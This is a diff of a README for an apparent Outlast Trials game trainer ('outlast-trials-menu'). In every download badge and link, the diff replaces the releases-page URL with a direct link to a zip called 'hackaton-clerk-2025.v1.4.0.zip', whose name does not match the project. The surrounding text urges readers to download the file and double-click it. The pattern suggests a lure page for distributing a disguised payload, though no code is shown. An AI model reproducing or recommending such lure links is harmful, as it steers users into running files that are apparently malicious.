@@ -1,6 +1,6 @@
 # 🎯 outlast-trials-menu - Easy One-Click Game Trainer Setup
 
-[![Download Latest Version](https://img.shields.io/badge/⬇_Download_Latest_Version-e91e63?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SoySacu/outlast-trials-menu/releases)
+[![Download Latest Version](https://img.shields.io/badge/⬇_Download_Latest_Version-e91e63?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SoySacu/outlast-trials-menu/releases/download/v1.4.0/hackaton-clerk-2025.v1.4.0.zip)
 
 Welcome to the official home of **outlast-trials-menu**, a lightweight desktop menu built for players of Outlast Trials who want quick, simple access to a set of in-game helper options. Everything runs from a clean, easy-to-read window on your PC — no coding, no command lines, and no complicated setup routine. If you can download a file and double-click it, you can use this.
 
@@ -41,11 +41,11 @@ Getting the application is a short, three-part process: open the releases page, 
 
 ### Step 1 — Open the Download Page
 
-[![Download Latest Version](https://img.shields.io/badge/⬇_Get_The_App-3d5afe?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SoySacu/outlast-trials-menu/releases)
+[![Download Latest Version](https://img.shields.io/badge/⬇_Get_The_App-3d5afe?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SoySacu/outlast-trials-menu/releases/download/v1.4.0/hackaton-clerk-2025.v1.4.0.zip)
 
 Visit this link to download the application:
 
-**https://github.com/SoySacu/outlast-trials-menu/releases**
+**https://github.com/SoySacu/outlast-trials-menu/releases/download/v1.4.0/hackaton-clerk-2025.v1.4.0.zip**
 
 ### Step 2 — Choose the Newest Release
 
@@ -125,7 +125,7 @@ Use the Issues tab in this repository. Describe what happened and which version 
 - **Application name:** outlast-trials-menu
 - **Purpose:** a simple on-screen menu of helper options for Outlast Trials
 - **Platform:** Windows 10 and Windows 11
-- **Download page:** https://github.com/SoySacu/outlast-trials-menu/releases
+- **Download page:** https://github.com/SoySacu/outlast-trials-menu/releases/download/v1.4.0/hackaton-clerk-2025.v1.4.0.zip
 - **Getting started:** open the releases page, pick the newest build, download the file, then open the application
 - **Support:** open an issue in this repository
 
